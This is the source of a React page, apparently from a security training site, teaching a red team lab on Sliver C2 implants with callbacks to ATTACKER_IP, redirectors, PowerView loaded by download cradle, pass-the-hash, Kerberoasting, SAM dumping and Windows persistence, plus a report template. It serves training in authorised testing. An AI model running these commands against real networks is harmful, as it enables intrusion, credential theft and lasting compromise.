'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#ff3333'
const dim = '#6a3a3a'
const border = '#3a0000'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: dim, letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#040404', border: '1px solid ' + border, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '2.5rem', marginBottom: '0.75rem' }}>
    <span style={{ color: border, marginRight: '8px' }}>//</span>{children}
  </h2>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)

const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,51,51, 0.06)', border: '1px solid rgba(255,51,51, 0.25)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0 }}>{children}</p>
  </div>
)

export default function RedTeamLab() {
  return (
    <div style={{ minHeight: '100vh', background: '#0c0000', color: '#c8b8b8', fontFamily: 'system-ui, sans-serif', padding: '2rem' }}>
      <div style={{ maxWidth: '860px', margin: '0 auto' }}>

        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, marginBottom: '2rem', letterSpacing: '0.1em' }}>
          <Link href="/" style={{ color: dim, textDecoration: 'none' }}>GHOSTNET</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <Link href="/modules/red-team" style={{ color: dim, textDecoration: 'none' }}>RED TEAM</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <span style={{ color: accent }}>LAB</span>
        </div>

        <div style={{ marginBottom: '2.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: dim, letterSpacing: '0.2em', marginBottom: '0.5rem' }}>HANDS-ON LAB</div>
          <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: 0 }}>Red Team Operations Lab</h1>
          <p style={{ color: '#7a4a4a', marginTop: '0.75rem', fontSize: '0.9rem' }}>
            C2 infrastructure, AD enumeration, lateral movement, persistence, and reporting.{' '}
            <Link href="/modules/red-team" style={{ color: accent, textDecoration: 'none' }}>Back to Concept &rarr;</Link>
          </p>
        </div>

        <div style={{ background: '#0a0000', border: '1px solid ' + border, borderRadius: '8px', padding: '1.5rem', marginBottom: '2rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, letterSpacing: '0.15em', marginBottom: '0.75rem' }}>LAB OVERVIEW</div>
          <P>This lab covers full red team operator tradecraft: deploying a C2 framework, building covert infrastructure, enumerating Active Directory, moving laterally with stolen credentials, establishing persistence, and writing a professional engagement report. Use an isolated lab environment — an internal Active Directory lab or a platform like HTB Pro Labs.</P>
          <div style={{ background: 'rgba(255,80,80,0.06)', border: '1px solid rgba(255,80,80,0.2)', borderRadius: '4px', padding: '0.75rem 1rem', marginTop: '0.75rem' }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#ff5050' }}>AUTHORIZATION REQUIRED — </span>
            <span style={{ fontSize: '0.82rem', color: '#8a7a7a' }}>Every technique in this lab must only be performed under a signed Rules of Engagement document. Unauthorized red team activity against real organizations is a serious criminal offense.</span>
          </div>
        </div>

        <H2>01 — Deploy Sliver C2 Framework</H2>
        <P>Sliver is an open-source adversary simulation framework developed by BishopFox. It supports multiple C2 channels including mTLS, WireGuard, HTTP/S, and DNS. Deploy a server and generate implants for both Windows and Linux targets.</P>
        <Note>Sliver is a legitimate red team tool. However, many EDR products detect it without customization. In real engagements, you would modify the implant profile, change default port numbers, and set up redirectors so the implant never talks directly to your server. The lab exercises here use default settings for learning.</Note>
        <Pre label="// EXERCISE 1 — DEPLOY SLIVER C2 SERVER">{`# Clone and build Sliver:
git clone https://github.com/BishopFoxSec/sliver
cd sliver && make
sudo make install

# Start the Sliver server:
sudo sliver-server

# Inside the Sliver console, start an mTLS listener:
# mtls --lhost ATTACKER_IP --lport 8888

# Generate a Windows implant (stageless):
# generate --mtls ATTACKER_IP:8888 --os windows --arch amd64 --save /tmp/implant.exe

# Generate a Linux implant:
# generate --mtls ATTACKER_IP:8888 --os linux --arch amd64 --save /tmp/implant_linux

# Generate an HTTP implant (more firewall-friendly):
# http
# generate --http ATTACKER_IP --os windows --save /tmp/implant_http.exe

# Once an implant calls back, you will see:
# [*] Session GHOST_TARGET - ATTACKER_IP:PORT (TARGET_HOSTNAME) - windows/amd64

# Interact with a session:
# use SESSION_ID
# whoami
# pwd
# ps
# screenshot`}</Pre>

        <H2>02 — Build Covert C2 Infrastructure</H2>
        <P>Professional red teams never expose their C2 server IP directly. They use redirectors — intermediate servers that forward traffic — and domain fronting to hide the true C2 destination. This exercise covers the infrastructure concepts and setup.</P>
        <Pre label="// EXERCISE 2 — BUILD COVERT C2 INFRASTRUCTURE">{`# Infrastructure layout:
# [Implant] --> [Redirector VPS] --> [C2 Server] (never exposed)

# Step 1: Set up an Apache redirector on a VPS
# Install Apache with mod_rewrite:
sudo apt install apache2
sudo a2enmod rewrite proxy proxy_http

# Step 2: Create a .htaccess redirector rule
# Legitimate traffic goes to a real site
# Implant traffic (matching a custom header or URI) is forwarded to C2

# Example redirect rule structure:
# RewriteEngine On
# RewriteCond %{HTTP_USER_AGENT} "GhostAgent" [NC]
# RewriteRule ^(.*)$ http://C2_SERVER_IP:8888$1 [P,L]
# RewriteRule ^(.*)$ https://microsoft.com [R=302,L]

# Step 3: Configure Sliver HTTP C2 profile to use custom headers
# In Sliver: profiles new-http --header "User-Agent: GhostAgent"

# Step 4: Domain considerations for engagements
# - Register a domain that looks legitimate (aged domains are better)
# - Obtain a valid TLS certificate (Let's Encrypt or purchased)
# - Set TTL low so you can rotate IPs quickly
# - Use categorized domains (finance, IT) to bypass web proxies

# Step 5: Test your redirector chain:
curl -H "User-Agent: GhostAgent" http://REDIRECTOR_IP/test
# Expected: forwarded to C2
curl http://REDIRECTOR_IP/test
# Expected: redirected to decoy site`}</Pre>

        <H2>03 — Active Directory Enumeration with PowerView</H2>
        <P>After gaining an initial foothold on a domain-joined machine, PowerView enables rapid enumeration of the Active Directory environment — users, groups, GPOs, trusts, and Kerberoastable accounts.</P>
        <Note>PowerView is a PowerShell script — it runs entirely in memory and does not touch disk if loaded with IEX (Invoke-Expression). This makes it harder for antivirus to catch. On modern EDR-protected environments you would obfuscate it further, but for lab learning, default PowerView works fine.</Note>
        <Pre label="// EXERCISE 3 — AD ENUMERATION FROM INITIAL FOOTHOLD">{`# Load PowerView in memory (from an implant or local PowerShell):
# IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Or import from disk on the target:
# Import-Module C:\Tools\PowerView.ps1

# Get basic domain information:
Get-Domain
Get-DomainController

# Enumerate all users:
Get-DomainUser | Select-Object samaccountname, description, lastlogon

# Find users with passwords that never expire (weak policy):
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD | Select-Object samaccountname

# Find Kerberoastable accounts (have SPNs set):
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Enumerate all groups:
Get-DomainGroup | Select-Object samaccountname, description

# Get members of Domain Admins:
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Find computers in the domain:
Get-DomainComputer | Select-Object dnshostname, operatingsystem

# Find where domain admin sessions are active:
Find-DomainUserLocation -UserIdentity "Administrator"

# Map GPO permissions:
Get-DomainGPO | Select-Object displayname, gpcfilesyspath

# Check for unconstrained delegation (high privilege escalation risk):
Get-DomainComputer -Unconstrained | Select-Object dnshostname`}</Pre>

        <H2>04 — Pass the Hash and Lateral Movement</H2>
        <P>NTLM hashes extracted from one machine can authenticate to other machines on the network without knowing the plaintext password. This pass-the-hash technique allows lateral movement across Windows environments.</P>
        <Pre label="// EXERCISE 4 — LATERAL MOVEMENT WITH STOLEN CREDENTIALS">{`# Prerequisite: You have dumped an NTLM hash from the current machine
# Using secretsdump or Mimikatz within your implant session

# Hash format: LM_HASH:NT_HASH
# For pass-the-hash only the NT portion matters
# Use NTLM_HASH as a placeholder for your captured hash

# Method 1: CrackMapExec pass-the-hash
cme smb 192.168.1.0/24 -u administrator -H NTLM_HASH --continue-on-success

# Execute a command via PTH:
cme smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami /all"

# Dump SAM from remote machine using PTH:
cme smb 192.168.1.10 -u administrator -H NTLM_HASH --sam

# Method 2: Impacket psexec (drops a service binary — noisy):
python3 psexec.py administrator@192.168.1.10 -hashes :NTLM_HASH

# Method 3: Impacket wmiexec (fileless — much quieter):
python3 wmiexec.py administrator@192.168.1.10 -hashes :NTLM_HASH

# Method 4: Impacket smbexec (service-based, output via SMB share):
python3 smbexec.py administrator@192.168.1.10 -hashes :NTLM_HASH

# Kerberoasting — request service tickets and crack offline:
# From impacket:
python3 GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile kerberoast.hashes

# Crack with hashcat (mode 13100 = Kerberos TGS):
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`}</Pre>

        <H2>05 — Persistence Mechanisms on Windows</H2>
        <P>After lateral movement, red teams establish persistence so the engagement survives reboots and credential rotations. This exercise covers three escalating persistence techniques: registry run keys, scheduled tasks, and WMI event subscriptions.</P>
        <Pre label="// EXERCISE 5 — ESTABLISH PERSISTENCE ON WINDOWS">{`# Method 1: Registry Run Key (simple, well-detected, but still used)
# Current user — survives user login:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GhostAgent /t REG_SZ /d "C:\Users\Public\agent.exe" /f

# All users — survives any login (requires admin):
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v GhostAgent /t REG_SZ /d "C:\Windows\System32\agent.exe" /f

# Verify:
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Method 2: Scheduled Task (more flexible, can survive without login)
# Run every 15 minutes as SYSTEM:
schtasks /create /tn "WindowsUpdateHelper" /tr "C:\Windows\Tasks\agent.exe" /sc minute /mo 15 /ru SYSTEM /f

# Run at boot:
schtasks /create /tn "WindowsDefenderHelper" /tr "C:\Windows\Tasks\agent.exe" /sc onstart /ru SYSTEM /f

# List all scheduled tasks:
schtasks /query /fo LIST /v | findstr /i "task\|run\|status"

# Method 3: WMI Event Subscription (fileless, hardest to detect and remove)
# PowerShell — create a WMI subscription that runs on process creation:
# This example triggers whenever notepad.exe is started (for lab demo only)

# Create filter (what to watch for):
# $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name="GhostFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'"}

# Create consumer (what to run):
# $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{Name="GhostConsumer"; CommandLineTemplate="C:\Windows\System32\agent.exe"}

# Bind them together:
# Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer}

# List existing WMI subscriptions:
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding`}</Pre>

        <H2>06 — Red Team Report Structure</H2>
        <P>A red team engagement is only as valuable as the report that documents it. The report must communicate risk to executives and provide actionable remediation steps for technical teams. This exercise provides a professional report template.</P>
        <Pre label="// EXERCISE 6 — REPORT STRUCTURE AND DELIVERABLES">{`# RED TEAM ENGAGEMENT REPORT TEMPLATE
# =====================================

# DOCUMENT METADATA
# -----------------
# Client Organization: CLIENT_NAME
# Engagement Type: Full Red Team / Assumed Breach / Purple Team
# Engagement Window: START_DATE to END_DATE
# Report Classification: CONFIDENTIAL
# Prepared By: Red Team Lead Name, Org Name
# Report Version: 1.0

# SECTION 1: EXECUTIVE SUMMARY (1-2 pages, non-technical)
# ---------------------------------------------------------
# Purpose: Written for C-level and board audiences
# Contents:
# - Engagement scope and objectives in plain English
# - Overall risk rating: CRITICAL / HIGH / MEDIUM / LOW
# - Key findings summary (3-5 bullet points maximum)
# - Business impact of each finding
# - Top 3 recommended actions with estimated effort

# SECTION 2: SCOPE AND RULES OF ENGAGEMENT
# ------------------------------------------
# - In-scope IP ranges and domains
# - Out-of-scope systems (production, critical infrastructure)
# - Authorized techniques (phishing, physical, external only, etc.)
# - Authorized hours (24x7 or business hours only)
# - Emergency stop contact information

# SECTION 3: ATTACK NARRATIVE (technical story)
# -----------------------------------------------
# Tell the attack as a timeline with timestamps:
# DAY 1 - Initial Access
#   14:32 — Sent spear phishing email to target@company.com
#   14:47 — User opened attachment, implant called back
#   14:48 — Established session on WORKSTATION-01 as USER_NAME
#
# DAY 2 - Privilege Escalation and Lateral Movement
#   09:15 — Ran PowerView, identified Kerberoastable accounts
#   09:22 — Requested TGS tickets for SVC_SQL account
#   11:40 — Cracked SVC_SQL password offline in 82 minutes
#   11:45 — Authenticated to SQL-SERVER-01 as SVC_SQL
#   12:00 — Dumped local SAM, found shared local admin password
#
# DAY 3 - Objective Achievement
#   08:30 — Lateral movement to FILESERVER-01 using shared password
#   08:35 — Accessed executive SharePoint site — OBJECTIVE ACHIEVED

# SECTION 4: FINDINGS (one card per finding)
# --------------------------------------------
# Finding ID: RT-001
# Title: Shared Local Administrator Password Across All Workstations
# Severity: CRITICAL
# CVSS Score: 9.0
# Description: All 347 workstations share the same local administrator
#   password. Compromise of one workstation grants admin on all others.
# Evidence: [Screenshot / command output / hash comparison]
# Impact: Complete lateral movement across the entire workstation fleet
#   without requiring domain credentials.
# Remediation: Deploy Microsoft LAPS (Local Administrator Password Solution)
#   to randomize the local admin password per machine.
# Effort to Fix: Medium (2-4 weeks for LAPS deployment)

# SECTION 5: REMEDIATION ROADMAP
# --------------------------------
# Priority 1 (Fix within 30 days): CRITICAL findings
# Priority 2 (Fix within 90 days): HIGH findings
# Priority 3 (Fix within 6 months): MEDIUM findings
# Priority 4 (Risk acceptance or monitoring): LOW findings

# DELIVERABLES CHECKLIST:
# [ ] Executive summary PDF
# [ ] Full technical report PDF
# [ ] Evidence archive (screenshots, pcaps, logs) in encrypted ZIP
# [ ] Raw tool output files
# [ ] Remediation tracking spreadsheet`}</Pre>

        <H2>Check Your Understanding</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', marginBottom: '2rem' }}>
          {[
            '1. What is the difference between a redirector and a C2 server, and why is a redirector necessary for OPSEC?',
            '2. What makes an account "Kerberoastable", and how does an attacker exploit this without touching the DC?',
            '3. Pass-the-Hash works against NTLM authentication. Which authentication protocol is immune to PTH, and why?',
            '4. Why is a WMI event subscription harder to detect and remove compared to a registry run key?',
            '5. What is the purpose of the Attack Narrative section in a red team report, and who is the primary audience?',
          ].map((q, i) => (
            <div key={i} style={{ background: '#0a0000', border: '1px solid ' + border, borderRadius: '4px', padding: '0.85rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.8rem', color: '#9a6a6a' }}>{q}</div>
          ))}
        </div>

        <H2>Further Practice</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '3rem' }}>
          {[
            { label: 'HTB Pro Labs — Offshore (enterprise AD network)', url: 'https://www.hackthebox.com/hacker/pro-labs' },
            { label: 'HTB Pro Labs — RastaLabs (red team simulation)', url: 'https://www.hackthebox.com/hacker/pro-labs' },
            { label: 'HTB Pro Labs — Cybernetics (modern Windows AD)', url: 'https://www.hackthebox.com/hacker/pro-labs' },
            { label: 'TryHackMe — Red Team Fundamentals Path', url: 'https://tryhackme.com/path/outline/redteaming' },
          ].map((r, i) => (
            <a key={i} href={r.url} target="_blank" rel="noopener noreferrer" style={{ display: 'block', background: '#0a0000', border: '1px solid ' + border, borderRadius: '4px', padding: '0.75rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>
              &rarr; {r.label}
            </a>
          ))}
        </div>

        <div style={{ borderTop: '1px solid ' + border, paddingTop: '1.5rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <Link href="/modules/red-team" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: dim, textDecoration: 'none' }}>&larr; Back to Concept</Link>
          <Link href="/modules" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>All Modules &rarr;</Link>
        </div>

      </div>
    </div>
  )
}
